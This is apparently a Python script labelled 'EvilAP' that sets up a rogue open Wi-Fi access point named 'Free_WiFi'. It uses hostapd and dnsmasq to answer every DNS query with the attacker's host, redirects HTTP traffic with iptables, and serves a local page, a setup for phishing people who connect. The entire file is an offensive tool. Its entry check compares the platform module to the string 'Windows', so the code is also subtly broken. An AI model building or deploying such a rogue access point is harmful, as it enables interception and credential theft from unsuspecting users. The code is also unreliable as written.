import os
import subprocess
import platform
import threading

def start_ap():
    os.system("systemctl stop NetworkManager")
    os.system("ip link set wlan0 down")
    os.system("ip addr flush dev wlan0")
    os.system("ip link set wlan0 up")

    with open("/etc/hostapd/hostapd.conf", "w") as f:
        f.write("""interface=wlan0
driver=nl80211
ssid=Free_WiFi
hw_mode=g
channel=6
macaddr_acl=0
auth_algs=1
ignore_broadcast_ssid=0
        """)

    os.system("hostapd /etc/hostapd/hostapd.conf -B")
    os.system("ip addr add 10.0.0.1/24 dev wlan0")

    with open("/etc/dnsmasq.conf", "w") as f:
        f.write("""interface=wlan0
dhcp-range=10.0.0.2,10.0.0.20,255.255.255.0,24h
address=/#/10.0.0.1
        """)

    os.system("dnsmasq")

    os.system("iptables -t nat -A PREROUTING -p tcp --dport 80 -j DNAT --to-destination 10.0.0.1:80")
    os.system("iptables -t nat -A POSTROUTING -j MASQUERADE")

    # Запуск веб-сервера
    os.chdir("evilap")
    os.system("python3 -m http.server 80 &")

if __name__ == "__main__":
    if platform == "Windows":
        start_ap()
        print("[+] EvilAP запущен на SSID: Free_WiFi")